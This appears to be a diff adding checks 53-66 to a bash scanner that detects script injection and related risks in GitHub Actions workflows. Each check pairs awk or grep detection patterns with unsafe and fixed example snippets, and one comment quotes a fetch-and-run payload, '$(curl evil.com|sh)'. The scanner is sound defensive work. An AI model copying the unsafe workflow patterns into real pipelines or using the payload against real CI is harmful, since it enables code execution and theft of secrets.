@@ -31,7 +31,7 @@ FORMAT_RESULTS_FILE=""
 ISSUES_FOUND=0
 CHECKS_TO_RUN=()
 CURRENT_CHECK=""
-MAX_CHECK_NUM=52
+MAX_CHECK_NUM=66
 
 RED='\033[0;31m'
 YELLOW='\033[1;33m'
@@ -2952,6 +2952,520 @@ check_52() {
 
     if [[ -n "${unsafe_env_names}" ]]; then
         log_issue "HIGH" "${file}" "Contains dynamic environment variable names via expression interpolation - can lead to environment variable pollution attacks" "$(_extract_lines "${unsafe_env_names}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 53: github.actor / github.triggering_actor in run blocks
+# =============================================================================
+check_53_description="github.actor / github.triggering_actor interpolation in run blocks"
+check_53_severity="HIGH"
+
+example_check_53() {
+    cat <<'EOF'
+# Why: github.actor is the username of the user who triggered the workflow.
+# In forked PR workflows it is fully controlled by an external contributor.
+# Interpolating it directly into a run: block can enable path construction
+# attacks, log injection, and, combined with other vectors, shell injection.
+#
+# BEFORE (unsafe - actor value injected directly into shell):
+  run: echo "PR by ${{ github.actor }}"
+  run: mkdir "/data/${{ github.triggering_actor }}"
+# AFTER (safe - pass through env var):
+  env:
+    ACTOR: ${{ github.actor }}
+  run: echo "PR by ${ACTOR}"
+EOF
+}
+
+check_53() {
+    local file="$1"
+    local hits
+    hits=$(awk "${AWK_RUN_BLOCK_DETECT}"'
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.(actor|triggering_actor)/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.(actor|triggering_actor)/ { print NR }
+    ' "${file}" 2>/dev/null)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Contains github.actor/github.triggering_actor interpolation directly in run: block - pass via env var instead" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 54: github.event.issue.title interpolation in run blocks
+# =============================================================================
+check_54_description="github.event.issue.title interpolation in run blocks"
+check_54_severity="HIGH"
+
+example_check_54() {
+    cat <<'EOF'
+# Why: Issue titles are fully attacker-controlled (any GitHub user can create
+# an issue with arbitrary text including shell metacharacters like
+# $(curl evil.com|sh)). Check 1 covers issue.body but not issue.title.
+#
+# BEFORE (unsafe - issue title injected into shell):
+  run: echo "${{ github.event.issue.title }}"
+# AFTER (safe - pass through env var):
+  env:
+    ISSUE_TITLE: ${{ github.event.issue.title }}
+  run: echo "${ISSUE_TITLE}"
+EOF
+}
+
+check_54() {
+    local file="$1"
+    local hits
+    hits=$(awk "${AWK_RUN_BLOCK_DETECT}"'
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.issue\.title/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.event\.issue\.title/ { print NR }
+    ' "${file}" 2>/dev/null)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Contains github.event.issue.title interpolation directly in run: block - attacker-controlled field, pass via env var" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 55: github.event.pull_request.head.repo.full_name / head.label in run blocks
+# =============================================================================
+check_55_description="github.event.pull_request.head.repo/label interpolation in run blocks"
+check_55_severity="HIGH"
+
+example_check_55() {
+    cat <<'EOF'
+# Why: In fork-based PRs, head.repo.full_name is the attacker's fork path
+# (e.g., "attacker/repo"), and head.label contains "attacker:branch-name".
+# The branch name portion is fully attacker-controlled and can contain shell
+# metacharacters. Check 21 only catches these in pull_request_target+checkout
+# contexts; direct run: block interpolation is unchecked.
+#
+# BEFORE (unsafe - fork path injected into shell):
+  run: echo "Fork ${{ github.event.pull_request.head.repo.full_name }}"
+  run: echo "Label ${{ github.event.pull_request.head.label }}"
+# AFTER (safe - pass through env var):
+  env:
+    FORK_REPO: ${{ github.event.pull_request.head.repo.full_name }}
+  run: echo "Fork ${FORK_REPO}"
+EOF
+}
+
+check_55() {
+    local file="$1"
+    local hits
+    hits=$(awk "${AWK_RUN_BLOCK_DETECT}"'
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.pull_request\.head\.(repo\.|label)/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.event\.pull_request\.head\.(repo\.|label)/ { print NR }
+    ' "${file}" 2>/dev/null)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Contains github.event.pull_request.head.repo/label interpolation in run: block - fork-controlled field, pass via env var" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 56: User login fields in run blocks
+# =============================================================================
+check_56_description="github.event.*.user.login / sender.login interpolation in run blocks"
+check_56_severity="MEDIUM"
+
+example_check_56() {
+    cat <<'EOF'
+# Why: Fields like github.event.review.user.login, github.event.comment.user.login,
+# and github.event.sender.login represent usernames of event actors. Check 16
+# covers .body fields but not .user.login sub-fields. Defense-in-depth requires
+# these to flow through env vars rather than direct interpolation.
+#
+# BEFORE (unsafe - user login injected into shell):
+  run: echo "${{ github.event.review.user.login }}"
+  run: echo "${{ github.event.sender.login }}"
+# AFTER (safe - pass through env var):
+  env:
+    REVIEWER: ${{ github.event.review.user.login }}
+  run: echo "${REVIEWER}"
+EOF
+}
+
+check_56() {
+    local file="$1"
+    local hits
+    hits=$(awk "${AWK_RUN_BLOCK_DETECT}"'
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.(review|comment|sender)\.user\.login/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.event\.(review|comment|sender)\.user\.login/ { print NR }
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.sender\.login/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.event\.sender\.login/ { print NR }
+    ' "${file}" 2>/dev/null)
+    if [[ -n "${hits}" ]]; then
+        log_issue "MEDIUM" "${file}" "Contains event user.login/sender.login interpolation directly in run: block - pass via env var" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 57: github.event.workflow_run.head_commit.message in run blocks
+# =============================================================================
+check_57_description="github.event.workflow_run.head_commit.message/author interpolation in run blocks"
+check_57_severity="HIGH"
+
+example_check_57() {
+    cat <<'EOF'
+# Why: workflow_run.head_commit.message contains the git commit message from
+# the triggering workflow's head commit. Commit messages are fully
+# attacker-controlled (arbitrary text including shell metacharacters).
+# Check 16 covers workflow_run.head_branch and head_sha but NOT head_commit.*
+#
+# BEFORE (unsafe - commit message injected into shell):
+  run: echo "${{ github.event.workflow_run.head_commit.message }}"
+# AFTER (safe - pass through env var):
+  env:
+    COMMIT_MSG: ${{ github.event.workflow_run.head_commit.message }}
+  run: echo "${COMMIT_MSG}"
+EOF
+}
+
+check_57() {
+    local file="$1"
+    local hits
+    hits=$(awk "${AWK_RUN_BLOCK_DETECT}"'
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.workflow_run\.head_commit\.(message|author\.(name|email))/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.event\.workflow_run\.head_commit\.(message|author\.(name|email))/ { print NR }
+    ' "${file}" 2>/dev/null)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Contains workflow_run.head_commit.message/author interpolation in run: block - attacker-controlled field, pass via env var" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 58: github.event.deployment.* in run blocks
+# =============================================================================
+check_58_description="github.event.deployment.payload/environment/description interpolation in run blocks"
+check_58_severity="HIGH"
+
+example_check_58() {
+    cat <<'EOF'
+# Why: Deployment payloads, environment names, and descriptions can contain
+# arbitrary data controlled by whoever created the deployment (external
+# integrations, users with deploy access). When interpolated directly into
+# run: blocks they become injection vectors.
+#
+# BEFORE (unsafe - deployment payload injected into shell):
+  run: echo "${{ github.event.deployment.payload }}"
+  run: echo "${{ github.event.deployment.environment }}"
+# AFTER (safe - pass through env var):
+  env:
+    DEPLOY_ENV: ${{ github.event.deployment.environment }}
+  run: echo "${DEPLOY_ENV}"
+EOF
+}
+
+check_58() {
+    local file="$1"
+    local hits
+    hits=$(awk "${AWK_RUN_BLOCK_DETECT}"'
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.deployment\.(payload|environment|description)/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.event\.deployment\.(payload|environment|description)/ { print NR }
+    ' "${file}" 2>/dev/null)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Contains github.event.deployment.* interpolation in run: block - deployment data can be attacker-controlled, pass via env var" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 59: github.event.discussion.category.name and other discussion sub-fields
+# =============================================================================
+check_59_description="github.event.discussion.category.name and sub-field interpolation in run blocks"
+check_59_severity="MEDIUM"
+
+example_check_59() {
+    cat <<'EOF'
+# Why: Check 16 covers discussion.title and discussion.body but NOT
+# discussion.category.name or other sub-fields. While category names are
+# typically set by repo admins, they should not be interpolated directly.
+#
+# BEFORE (unsafe - discussion category injected into shell):
+  run: echo "${{ github.event.discussion.category.name }}"
+# AFTER (safe - pass through env var):
+  env:
+    CATEGORY: ${{ github.event.discussion.category.name }}
+  run: echo "${CATEGORY}"
+EOF
+}
+
+check_59() {
+    local file="$1"
+    local hits
+    hits=$(awk "${AWK_RUN_BLOCK_DETECT}"'
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.discussion\.(category\.|answer\.)/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.event\.discussion\.(category\.|answer\.)/ { print NR }
+    ' "${file}" 2>/dev/null)
+    if [[ -n "${hits}" ]]; then
+        log_issue "MEDIUM" "${file}" "Contains github.event.discussion sub-field interpolation in run: block - pass via env var" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 60: github.workflow in run blocks
+# =============================================================================
+check_60_description="github.workflow interpolation in run blocks"
+check_60_severity="MEDIUM"
+
+example_check_60() {
+    cat <<'EOF'
+# Why: github.workflow is the workflow's name: field. Workflow names are
+# arbitrary strings (valid YAML) and can contain shell metacharacters.
+# Interpolating the workflow name into a run: block is an injection risk,
+# especially if workflow names are ever derived from user-facing input.
+#
+# BEFORE (unsafe - workflow name injected into shell):
+  run: echo "Workflow ${{ github.workflow }}"
+# AFTER (safe - pass through env var):
+  env:
+    WF_NAME: ${{ github.workflow }}
+  run: echo "Workflow ${WF_NAME}"
+EOF
+}
+
+check_60() {
+    local file="$1"
+    local hits
+    hits=$(awk "${AWK_RUN_BLOCK_DETECT}"'
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.workflow[^_]/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.workflow[^_]/ { print NR }
+    ' "${file}" 2>/dev/null)
+    if [[ -n "${hits}" ]]; then
+        log_issue "MEDIUM" "${file}" "Contains github.workflow interpolation directly in run: block - workflow names can contain shell metacharacters, pass via env var" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 61: run-name with attacker-controlled expressions
+# =============================================================================
+check_61_description="run-name with attacker-controlled expressions"
+check_61_severity="LOW"
+
+example_check_61() {
+    cat <<'EOF'
+# Why: The top-level run-name: field controls the display name of a workflow
+# run in the GitHub Actions UI. If it contains attacker-controlled data (e.g.,
+# a PR title), the attacker can inject misleading text into the UI, enabling
+# social engineering (making a malicious run look legitimate).
+#
+# BEFORE (unsafe - PR title injected into run name):
+run-name: "PR ${{ github.event.pull_request.title }}"
+# AFTER (safe - use static name or safe fields):
+run-name: "PR #${{ github.event.pull_request.number }} on ${{ github.ref_name }}"
+EOF
+}
+
+check_61() {
+    local file="$1"
+    local hits
+    # Flag run-name: lines with ${{ expressions containing attacker-controlled TEXT fields.
+    # Numeric/safe fields (number, id, sha, ref_name) are not flagged.
+    # Two-pass: first find run-name lines with ${{, then filter for risky text fields.
+    hits=$(grep -nE '^run-name:.*\$\{\{' "${file}" 2>/dev/null \
+        | grep -E 'github\.(actor|triggering_actor|workflow)\b|github\.event\.(pull_request\.(title|body|head\.(ref|label|repo))|issue\.(title|body)|comment\.body|review\.body|discussion\.(title|body)|sender\.login|deployment\.(payload|description))' \
+        || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "LOW" "${file}" "Contains attacker-controlled text expressions in run-name: - enables social engineering via misleading workflow run names" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 62: environment: with attacker-controlled expressions
+# =============================================================================
+check_62_description="environment: with attacker-controlled expressions"
+check_62_severity="HIGH"
+
+example_check_62() {
+    cat <<'EOF'
+# Why: jobs.<job>.environment controls which GitHub Environment the job runs
+# against, including which secrets are accessible and which protection rules
+# apply. If the expression is attacker-controlled (e.g., github.head_ref),
+# an attacker can craft a branch name matching a privileged environment name
+# (e.g., "production") and gain access to that environment's secrets.
+#
+# BEFORE (unsafe - branch name controls which environment (and secrets) are used):
+  deploy:
+    environment: ${{ github.event.pull_request.head.ref }}
+# AFTER (safe - hardcode the environment name):
+  deploy:
+    environment: production
+EOF
+}
+
+check_62() {
+    local file="$1"
+    local hits
+    # Flag environment: lines whose value is a ${{ expression containing attacker-controlled data
+    # Two-pass: find environment: lines with ${{, then filter for risky sources
+    hits=$(grep -nE '^[[:space:]]+environment:[[:space:]]*\$\{\{' "${file}" 2>/dev/null \
+        | grep -E 'github\.(event\.|actor|triggering_actor|head_ref|base_ref)|inputs\.' \
+        || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Contains attacker-controlled expression in environment: key - can redirect job to access a different environment's secrets" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 63: GITHUB_STEP_SUMMARY written from attacker-controlled sources
+# =============================================================================
+check_63_description="attacker-controlled data written to GITHUB_STEP_SUMMARY"
+check_63_severity="MEDIUM"
+
+example_check_63() {
+    cat <<'EOF'
+# Why: GITHUB_STEP_SUMMARY renders markdown in the GitHub Actions UI job
+# summary page. Writing attacker-controlled data to it enables UI injection:
+# phishing links, fake status badges, misleading content. Check 32 covers
+# GITHUB_ENV/PATH/OUTPUT but not GITHUB_STEP_SUMMARY.
+#
+# BEFORE (unsafe - PR title injected into job summary):
+  env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: echo "## ${TITLE}" >> "${GITHUB_STEP_SUMMARY}"
+# AFTER (safe - use printf with format string, or sanitize first):
+  env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: printf '## %s\n' "${TITLE}" >> "${GITHUB_STEP_SUMMARY}"
+EOF
+}
+
+check_63() {
+    local file="$1"
+    local hits
+    # Detect ${{ attacker-controlled-expression }} on lines that also redirect to GITHUB_STEP_SUMMARY.
+    # This catches patterns like:
+    #   run: echo "${{ github.event.pull_request.title }}" >> "${GITHUB_STEP_SUMMARY}"
+    hits=$(grep -nE 'GITHUB_STEP_SUMMARY' "${file}" 2>/dev/null \
+        | grep -E '\$\{\{' \
+        | grep -E 'github\.(event\.|actor|triggering_actor|workflow)|inputs\.' \
+        || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "MEDIUM" "${file}" "Contains attacker-controlled ${{ }} expression written to GITHUB_STEP_SUMMARY - enables markdown/UI injection in job summary" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 64: continue-on-error: true on security-sensitive steps
+# =============================================================================
+check_64_description="continue-on-error: true pattern (security check bypass risk)"
+check_64_severity="MEDIUM"
+
+example_check_64() {
+    cat <<'EOF'
+# Why: continue-on-error: true causes a step's failure to be silently ignored,
+# and subsequent steps proceed regardless. When used on security checks,
+# permission gates, or validation steps, a failure (whether accidental or
+# attacker-induced) bypasses the security control and allows the pipeline to
+# continue to sensitive operations like deployment.
+#
+# BEFORE (unsafe - security check failure is silently ignored):
+  steps:
+    - run: ./security-scan.sh
+      continue-on-error: true
+    - run: ./deploy.sh
+# AFTER (safe - let security checks fail the job):
+  steps:
+    - run: ./security-scan.sh
+    - run: ./deploy.sh
+EOF
+}
+
+check_64() {
+    local file="$1"
+    local hits
+    hits=$(grep -nE '^[[:space:]]+continue-on-error:[[:space:]]*(true|\$\{\{)' "${file}" 2>/dev/null || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "MEDIUM" "${file}" "Contains continue-on-error: true - if used on security/validation steps, failures are silently ignored; review each occurrence" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 65: github.event.merge_group.head_commit.message in run blocks
+# =============================================================================
+check_65_description="github.event.merge_group.head_commit.message interpolation in run blocks"
+check_65_severity="HIGH"
+
+example_check_65() {
+    cat <<'EOF'
+# Why: Merge queue events (merge_group) include commit messages that may
+# originate from attacker-controlled PR content. Commit messages are fully
+# attacker-controlled (arbitrary text including shell metacharacters).
+# No existing check covers the merge_group event context.
+#
+# BEFORE (unsafe - merge group commit message injected into shell):
+  run: echo "${{ github.event.merge_group.head_commit.message }}"
+# AFTER (safe - pass through env var):
+  env:
+    COMMIT_MSG: ${{ github.event.merge_group.head_commit.message }}
+  run: echo "${COMMIT_MSG}"
+EOF
+}
+
+check_65() {
+    local file="$1"
+    local hits
+    hits=$(awk "${AWK_RUN_BLOCK_DETECT}"'
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.event\.merge_group\.(head_commit\.(message|author)|head_ref|head_sha)/ { print NR; next }
+        in_run_block && /\$\{\{.*github\.event\.merge_group\.(head_commit\.(message|author)|head_ref|head_sha)/ { print NR }
+    ' "${file}" 2>/dev/null)
+    if [[ -n "${hits}" ]]; then
+        log_issue "HIGH" "${file}" "Contains github.event.merge_group.head_commit.* interpolation in run: block - commit messages are attacker-controlled, pass via env var" "$(_extract_lines "${hits}")"
+        return 1
+    fi
+    return 0
+}
+
+# =============================================================================
+# Check 66: concurrency group with github.actor
+# =============================================================================
+check_66_description="concurrency group expression with github.actor"
+check_66_severity="MEDIUM"
+
+example_check_66() {
+    cat <<'EOF'
+# Why: Check 34 catches attacker-controlled data in concurrency groups
+# (github.head_ref, github.event.*, inputs.*) but NOT github.actor.
+# An attacker controlling their username value could construct concurrency
+# group IDs that collide with and cancel legitimate production workflow runs.
+#
+# BEFORE (risky - actor can construct colliding concurrency group):
+  concurrency:
+    group: deploy-${{ github.actor }}
+# AFTER (safe - use stable, predictable identifiers):
+  concurrency:
+    group: deploy-${{ github.ref }}-${{ github.workflow }}
+EOF
+}
+
+check_66() {
+    local file="$1"
+    local hits
+    hits=$(grep -nE 'group:[[:space:]].*\$\{\{.*github\.(actor|triggering_actor)' "${file}" 2>/dev/null || true)
+    if [[ -n "${hits}" ]]; then
+        log_issue "MEDIUM" "${file}" "Contains github.actor/triggering_actor in concurrency group - can enable run cancellation attacks" "$(_extract_lines "${hits}")"
         return 1
     fi
     return 0
